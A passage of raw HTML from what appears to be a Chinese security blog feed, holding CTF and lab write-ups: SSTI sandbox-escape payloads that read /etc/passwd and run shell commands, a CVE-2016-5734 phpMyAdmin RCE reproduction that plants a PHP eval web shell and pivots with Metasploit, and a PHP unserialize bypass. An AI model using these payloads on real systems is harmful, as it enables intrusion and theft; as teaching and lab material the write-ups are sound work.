class="string">&#x27;next&#x27;</span>)</span><br><span class="line">(<span class="number">15</span>, <span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">(<span class="number">16</span>, <span class="string">&#x27;closed&#x27;</span>)</span><br><span class="line">(<span class="number">17</span>, <span class="string">&#x27;tell&#x27;</span>)</span><br><span class="line">(<span class="number">18</span>, <span class="string">&#x27;mode&#x27;</span>)</span><br><span class="line">(<span class="number">19</span>, <span class="string">&#x27;__exit__&#x27;</span>)</span><br><span class="line">(<span class="number">20</span>, <span class="string">&#x27;isatty&#x27;</span>)</span><br><span class="line">(<span class="number">21</span>, <span class="string">&#x27;truncate&#x27;</span>)</span><br><span class="line">(<span class="number">22</span>, <span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">(<span class="number">23</span>, <span class="string">&#x27;__getattribute__&#x27;</span>)</span><br><span class="line">(<span class="number">24</span>, <span class="string">&#x27;__iter__&#x27;</span>)</span><br><span class="line">(<span class="number">25</span>, <span class="string">&#x27;readline&#x27;</span>)</span><br><span class="line">(<span class="number">26</span>, <span class="string">&#x27;fileno&#x27;</span>)</span><br><span class="line">(<span class="number">27</span>, <span class="string">&#x27;writelines&#x27;</span>)</span><br><span class="line">(<span class="number">28</span>, <span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">(<span class="number">29</span>, <span class="string">&#x27;__doc__&#x27;</span>)</span><br><span class="line">(<span class="number">30</span>, <span class="string">&#x27;__delattr__&#x27;</span>)</span><br><span class="line">(<span class="number">31</span>, <span class="string">&#x27;__repr__&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>python3：没有file类，利用内置函数open()来读取文件</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__[<span class="string">&quot;open&quot;</span>](<span class="string">&quot;/etc/passwd&quot;</span>).read()</span><br></pre></td></tr></table></figure><p>当然还有命令执行、文件写入等操作，只需要找到相应的函数方法即可，比如<code>os.popen()、system()</code>等</p><h3 id="四、XCTF中SSTI相关题目"><a href="#四、XCTF中SSTI相关题目" class="headerlink" title="四、XCTF中SSTI相关题目"></a>四、XCTF中SSTI相关题目</h3><h4 id="1、-Web-python-template-injection"><a href="#1、-Web-python-template-injection" class="headerlink" title="1、 Web_python_template_injection"></a>1、 Web_python_template_injection</h4><p>题目页面提示为python模板注入，但是直接穿参没有效果，尝试访问index.php发现会有not found提示，于是在index.php后添加模板注入参数，成功解析：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/28/1603898926.png" alt="1603894087160.png"></p><p>尝试读取flag文件无果后，利用命令执行来查看当前目录下文件，payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()</span><br></pre></td></tr></table></figure><p>得到flag文件名：fl4g<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/28/1603898936.png" alt="1603894436365.png"></p><p>读取flag，payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&quot;fl4g&quot;</span>).read()</span><br></pre></td></tr></table></figure><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/28/1603898945.png" alt="1603894611355.png"></p><p>这道题目还用到了 <code>__init__</code>和<code>__globals__</code></p><ul><li><p> <code>__init__</code> ： 类的初始化方法 </p></li><li><p><code>__globals__</code> ： 对包含函数全局变量的字典的引用 </p></li></ul><h4 id="2、-easytornado"><a href="#2、-easytornado" class="headerlink" title="2、 easytornado"></a>2、 easytornado</h4><p>题目页面有三个文件链接，分别访问：</p><ul><li>flag.txt：提示 flag in /fllllllllllllag</li><li>welcome.txt：提示 render </li><li>hint.txt：提示 md5(cookie_secret+md5(filename)) </li></ul><p>而且访问该文件时，url会出现<strong>filename</strong>和<strong>filehash</strong>参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://220.249.52.133:46061/file?filename=/hints.txt&amp;filehash=4016066a51c646157d04c91b76864a4d</span><br></pre></td></tr></table></figure><p>由此断定，需要利用<strong>fllllllllllllag</strong>文件名构造得到filehash来访问得到flag；由hint提示的构造方法，得知构造filehash需要<strong>cookie_secret</strong>变量的值；由welcome提示的render以及题目描述Tornado框架，可知在Tornado中可利用<strong>handler.settings</strong>访问得到Web关键字参数</p><p>修改文件名为不存在，可触发error页面，msg参数传入模板解析数据，得到cookie_secret</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/28/1603898956.png" alt="1603896553708.png"></p><p>利用已知数据及构造方式，得到filehash，访问即可得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://220.249.52.133:46061/file?filename=/fllllllllllllag&amp;filehash=362f231da5422730e87f8c009eb25f91</span><br></pre></td></tr></table></figure><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/28/1603898968.png" alt="1603898335323.png"></p><p>当然在实际中会对输入做安全过滤，绕过过滤的方法详见这几位师傅的博文：</p><p><a href="https://www.cnblogs.com/zaqzzz/p/10263396.html"><strong>https://www.cnblogs.com/zaqzzz/p/10263396.html</strong></a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11425368.html"><strong>https://www.cnblogs.com/20175211lyz/p/11425368.html</strong></a></p><h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><p><a href="https://www.anquanke.com/post/id/188172">https://www.anquanke.com/post/id/188172</a></p><p><a href="https://www.cnblogs.com/Xy--1/p/12841941.html">https://www.cnblogs.com/Xy–1/p/12841941.html</a></p><p><a href="https://www.cnblogs.com/hackxf/p/10480071.html">https://www.cnblogs.com/hackxf/p/10480071.html</a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11425368.html">https://www.cnblogs.com/20175211lyz/p/11425368.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI模板注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【漏洞分析】CVE-2016-5734 - phpmyadmin远程代码执行</title>
      <link href="post/20201052133.html"/>
      <url>post/20201052133.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-漏洞复现"><a href="#0x00-漏洞复现" class="headerlink" title="0x00 漏洞复现"></a>0x00 漏洞复现</h2><p>Docker拉取镜像，创建靶场环境，Kali上有利用脚本，直接搜索即可：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830647.png" alt="image2.png"></p><p>使用方法在脚本中有写，以下命令即可利用漏洞远程执行命令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 <span class="number">40185.</span>py -u root -p root http://<span class="number">192.168</span><span class="number">.11</span><span class="number">.12</span>:<span class="number">8080</span>/ -c <span class="string">&quot;system(&#x27;whoami &amp; uname -a&#x27;);&quot;</span></span><br></pre></td></tr></table></figure><p>其中-c 表示执行的php代码，此处利用php的system函数执行系统命令<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830669.png" alt="image3.png"></p><p>可以创建php木马文件并写入内容，以phpinfo为例，此时-c参数需要利用**file_put_contents()**函数来写入文件： <code>&quot;file_put_contents(&#39;info.php&#39;,&#39;&lt;?php phpinfo();?&gt;&#39;);&quot;</code></p><p>成功创建并访问并解析<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830727.png" alt="image5.png"></p><p>写入一句话木马（$符号需要加反斜杠转义）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 <span class="number">40185.</span>py -u root -p root http://<span class="number">192.168</span><span class="number">.11</span><span class="number">.12</span>:<span class="number">8080</span>/ -c <span class="string">&quot;file_put_contents(&#x27;shell.php&#x27;,&#x27;&lt;?php @eval(\$_POST[cmd]);?&gt;&#x27;);&quot;</span></span><br></pre></td></tr></table></figure><p>蚁剑连接（需要选编码方式，default会返回空）<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830750.png" alt="image6.png"></p><p>msfvenom生成二进制木马，利用蚁剑上传到目标主机，虚拟终端操作木马文件，赋予其执行权限<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830756.png" alt="image7.png"></p><p>Kali上监听4444端口，使用蚁剑在目标主机上执行木马文件，即可建立连接<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830762.png" alt="image8.png"></p><p>继续进行简单的内网渗透</p><p>查看内网网段信息：<strong>run get_local_subnets</strong><br>为目标主机添加路由：<strong>run autoroute -s 172.24.0.0/24</strong><br>查看路由表：<strong>run autoroute -p</strong><br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830777.png" alt="image9.png"></p><p>background将会话后置，使用mysql扫描模块进行扫描，成功发现内网mysql服务主机</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">use auxiliary/scanner/mysql/mysql_login</span><br><span class="line">set rhosts 172.24.0.1/24</span><br></pre></td></tr></table></figure><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830796.png" alt="image10.png"></p><p>可设置用户名密码对其进行爆破，也可以利用其他模块对内网进行探测攻击。</p><p> </p><h2 id="0x01-原理分析"><a href="#0x01-原理分析" class="headerlink" title="0x01 原理分析"></a>0x01 原理分析</h2><p>参考网上师傅们的文章，得知漏洞出自/libraries/TableSearch.class.php文件，发生在第1388行_getRegexReplaceRows()函数里的preg_replace()正则替换函数处，preg_replace()函数的三个参数中两个可控，一个简介可控，因此只要构造相应的数据即可触发RCE</p><p>/libraries/TableSearch.class.php文件的_getRegexReplaceRows()函数如下：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830876.png" alt="image11.png"></p><p>需要构造payload就需要对find、replaceWith、row[0]三个参数进行溯源分析，搜索_getRegexReplaceRows()函数，在第1430行发现在getReplacePreview()函数内部进行了调用，依然只是单纯的传参，继续溯源getReplacePreview()函数<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830883.png" alt="image12.png"></p><p>在tbl_find_replace.php文件中发现调用了getReplacePreview()函数，且使用POST方式接受四个参数，包括前边preg_replace()函数的find和replace两个参数，即第1、2参数<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830889.png" alt="image13.png"></p><p>此时已知preg_replace的前两个参数可控，但是要执行命令的条件是需要在第三个参数中匹配到第一个参数的内容，所以还需要对第三个参数进行溯源</p><p>回到/libraries/TableSearch.class.php文件的_getRegexReplaceRows()函数处，preg_replace()函数第三个参数是row[0]，表示该参数是数据库查找结果result的第一行，上边也写出了拼接的查询语句<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830927.png" alt="image14.png"></p><p>其中PMA_Util类在/libraries/Util.class.php类文件中进行了定义，其内部方法基本就是对原始数据做安全处理，如敏感字符的替换、编码、删除等操作，截取其中的一个sqlAddSlashes()函数作为示例：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830943.png" alt="image15.png"></p><p>由于要构造payload的地方并不是SQL查询参数处，所以PMA_Util类的过滤操作可以略过，因此该SQL查询语句可以理解为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> $columnname ,<span class="number">1</span>,cont(<span class="operator">*</span>) <span class="keyword">FROM</span> database.table_name <span class="keyword">WHERE</span> $columnname RLIKE ‘$find’ <span class="keyword">COLLATE</span> $charset_bin <span class="keyword">GROUP</span> <span class="keyword">BY</span> $columnname <span class="keyword">ORDER</span> <span class="keyword">BY</span> $<span class="keyword">column</span> <span class="keyword">ASC</span>;</span><br></pre></td></tr></table></figure><p>其中有两个查询参数：$this-&gt;_db、$this-&gt;_table是当前类的两个成员变量：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830965.png" alt="image16.png"></p><p>对其溯源，最终在当前类的构造函数__construct()中发现了定义，是初始化时接收的参数，所以就需要继续对当前类的实例化进行溯源，找到传入的参数<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830977.png" alt="image17.png"></p><p>已知当前类是PMA_TableSearch<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830984.png" alt="image18.png"></p><p>对当前类的实例化进行溯源，最终在漏洞发生处，即tbl_find_replace.php文件中发现了引用，但是依然是直接传入参数：$db, $table，因此需要对这两个参数继续溯源<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601830996.png" alt="image19.png"></p><p>发现上图中，tbl_find_replace.php文件除了包含libraries/TableSearch.class.php文件外，还包含了libraries/common.inc.php文件，因此直接在libraries/common.inc.php文件中搜索定义的全局变量，最终在第525和531行找到<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601831011.png" alt="image20.png"></p><p>而且在下面的代码中发现，db和table是通过REQUEST方式从表单接收来的，其中db是数据库名，table是表名，然后对其进行查询操作。</p><p>至此，数据溯源完毕，整体链如下：</p><ul><li>REQUEST接收数据库名db和表名table，对其进行查询操作；</li><li>将查询结果第一行的值row[0]赋值给preg_replace()函数第三个参数；</li><li>通过POST方式接收find和replaceWith参数，分别赋值给preg_replace()的第一、二个参数；</li><li>由于第一二个参数可控，因此只要让数据库查询结果的第一行中是已知的（因为要匹配到才能触发/e执行php语句），或是可控的，即可构造payload进行代码执行，甚至RCE。</li></ul><p>该文件本来想要实现的功能应该是replace即修改操作，但是忽略了preg_replace()函数的/e模式，且参数可控，未做安全校验。</p><h2 id="0x02-POC-EXP分析"><a href="#0x02-POC-EXP分析" class="headerlink" title="0x02 POC/EXP分析"></a>0x02 POC/EXP分析</h2><p>已知原理，现在分析一下kali中给出的POC，其实已经是EXP了，因为可以直接执行任意命令。</p><p>首先判断是否指定数据库，没有指定的话就默认选择test库，然后创建prgpwn表，再创建一个first字段，并写入内容<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601831065.png" alt="image21.png"></p><p>写入的内容是经过UNHEX()16进制转字符串后的内容：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601831070.png" alt="image22.png"></p><p>可以在数据库中查看EXP执行结果，成功创建相关内容：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601831075.png" alt="image23.png"></p><p>完成后，再对find和replaceWith参数进行可控赋值，find传入0/e\0，\0用于截断源码中find后边的反斜杠，replaceWith就可以传入payload了，即要执行的php代码<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601831080.png" alt="image24.png"></p><p>此时因为db和table指定的查询结果就是刚才写入的内容，再与传入的find成功匹配，加上/e模式，所以可以将replaceWith内容作为php代码执行，当传入执行的php代码为 system()函数时，即可进行RCE。</p><h2 id="0x03-preg-replace-函数分析"><a href="#0x03-preg-replace-函数分析" class="headerlink" title="0x03 preg_replace()函数分析"></a>0x03 preg_replace()函数分析</h2><p>preg_replace()函数用于正则替换，当模式为e时会将替换的字符串作为php代码执行，当我复现时发现，preg_replace()函数在php7中已经不再支持了，使用preg_replace_callback()函数作为替代方案<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601831110.png" alt="image25.png"></p><p>而且在php5.5.38和php5.6中也给出了替代提示，但是还可以正常使用；在php5.4及之前的版本都是可以的，且没有任何提示。</p><p>为了方便测试，本地使用php5.3.29作为测试环境，编写以下测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// $a = &quot;/&quot; . $_POST[&quot;a&quot;] . &quot;/&quot;;</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&quot;a&quot;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_POST</span>[<span class="string">&quot;b&quot;</span>];</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&quot;c&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;a : &quot;</span> . <span class="variable">$a</span>;</span><br><span class="line">var_dump(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt; b : &quot;</span> . <span class="variable">$b</span>;</span><br><span class="line">var_dump(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt; c : &quot;</span> . <span class="variable">$c</span>;</span><br><span class="line">var_dump(<span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$a</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$b</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$c</span>))&#123;</span><br><span class="line">preg_replace(<span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt; ERROR: Please Input Message&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>简单实现了一个POST传入三个参数a、b、c，将其传入preg_replace()函数进行正则替代。</p><p>首先传入正常的数据：a=/[1-9]/&amp;b=O&amp;c=a1b2c3d4<br>作用是在将c中所有的1-9的数字替换为O<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601831146.png" alt="image26.png"></p><p>使用/e命令执行模式，传入以下数据：a=/0/e&amp;b=phpinfo()&amp;c=/0/e<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601831159.png" alt="image27.png"></p><p>也可以传入以下参数：**<code>a=/(.)/e&amp;b=phpinfo()&amp;c=everything</code><strong>，其中</strong><code>/(.)/</code>**表示匹配第一个字符，所以待匹配的字符串是任何数据都行。</p><p>也可以传入以下参数：**<code>a=/(.*)/e&amp;b=phpinfo()&amp;c=everything</code><strong>，其中</strong><code>/(.*)/</code>**表示匹配所有，所以待匹配的字符串是任何数据都行。</p><p>也可以传入以下参数：**<code>a=/(.*)/e&amp;b=\1&amp;c=phpinfo()</code><strong>，其中</strong><code>/(.*)/</code><strong>表示匹配所有字符，而\1表示其本身，也就是要执行的php代码就是</strong><code>/(.*)/</code>**匹配的结果，即待匹配字符串的全部：phpinfo()<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/04/1601831170.png" alt="image28.png"></p><p>当传入system函数时，就可以RCE了。</p><p>最后，还有一个截断的问题，在EXP中用的是**<code>\0</code><strong>截断，但是在我测试中发现，单纯的</strong><code>\0</code>**并不能进行截断，很奇怪，反而是%00可以在php5的较低版本中进行截断，并触发命令执行。</p><p>参考漏洞中的情况，我们给第一个参数，即a两边加上 / ，如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&quot;/&quot;</span> . <span class="variable">$_POST</span>[<span class="string">&quot;a&quot;</span>] . <span class="string">&quot;/&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_POST</span>[<span class="string">&quot;b&quot;</span>];</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&quot;c&quot;</span>];</span><br></pre></td></tr></table></figure><p>使用的php版本是 <strong>php5.3.26</strong>，此时可以利用%00截断并触发代码执行：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/06/1601957543.png" alt="2020-10-06_12-10-35.png"></p><p>php &lt; 5.3.4存在%00截断是已知的，但是**<code>\0</code>**无法截断未能理解，希望哪位师傅知道缘由的可以告知我，感谢。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2016-5734 </tag>
            
            <tag> phpmyadmin远程代码执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【XCTF】 Web进阶区 WriteUp 汇总</title>
      <link href="post/20200972133.html"/>
      <url>post/20200972133.html</url>
      
        <content type="html"><![CDATA[<h2 id="⭐-Web-php-unserialize（-wakeup-绕过-正则匹配绕过）"><a href="#⭐-Web-php-unserialize（-wakeup-绕过-正则匹配绕过）" class="headerlink" title="⭐ Web_php_unserialize（__wakeup()绕过+正则匹配绕过）"></a>⭐ Web_php_unserialize（__wakeup()绕过+正则匹配绕过）</h2><p>一个反序列化题目，页面直接给出了源码：</p><pre><code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></code></pre><p><strong>进行简单的审计</strong></p><p>先是创建了一个Demo类，类中定义私有属性$file为文件名，并初始化了三个魔术方法：</p><ul><li>__construct() 构造函数在实例化类时执行</li><li>__destruct() 析构函数在销毁对象时执行</li><li>__wakeup() 在反序列化前执行</li></ul><p>其中<code>__wakeup()</code>中给出flag文件的提示，但是如果执行该函数，则会强制将包含文件改为index.php，因此此处是一个过滤点，需要绕过。<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/13/1602570893.png" alt="1602570853115.png"></p><p>继续往下，一个if else子句语句，GET接收var参数并进行base64解码，然后<code>preg_match(&#39;/[oc]:\d+:/i&#39;, $var)</code>做过滤，其中正则表达式的含义是：匹配<strong>o:任意数字</strong>或<strong>c:任意数字</strong>，匹配到则终止程序，因此这里也许要绕过。<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/13/1602570808.png" alt="1602570787053.png"></p><p>总共有两个过滤点需要绕过，先编写代码对Demo类实例化对象进行序列化，得到如下结果： </p><pre><code><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;\00Demo\00file&quot;;s:8:&quot;fl4g.php&quot;;&#125; </span><br></pre></td></tr></table></figure></code></pre><p>(\00为手动添加，因为是私有属性，但是\00在页面不会显示，所以需要手动添加)</p><p>绕过方法：</p><ol><li>绕过执行==__wakeup()==魔术方法，根据之前做的题目，只需要将序列化后的Json串中的属性个数修改为大于真实属性个数即可绕过执行该魔术方法</li><li>绕过<code>preg_match(&#39;/[oc]:\d+:/i&#39;, $var)</code>对序列化的匹配，将O:4改为O:+4即可，因为+4等同于4</li></ol><p>所以，在源码的基础上，添加序列化以及字符替换的代码，并直接输出base64编码后的序列化结果，代码如下：</p><pre><code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Demo(<span class="string">&quot;fl4g.php&quot;</span>);</span><br><span class="line"><span class="variable">$se</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$se</span> = str_replace(<span class="string">&quot;O:4&quot;</span>, <span class="string">&quot;O:+4&quot;</span>, <span class="variable">$se</span>);</span><br><span class="line"><span class="variable">$se</span> = str_replace(<span class="string">&#x27;&quot;Demo&quot;:1&#x27;</span>, <span class="string">&#x27;&quot;Demo&quot;:2&#x27;</span>, <span class="variable">$se</span>);</span><br><span class="line"><span 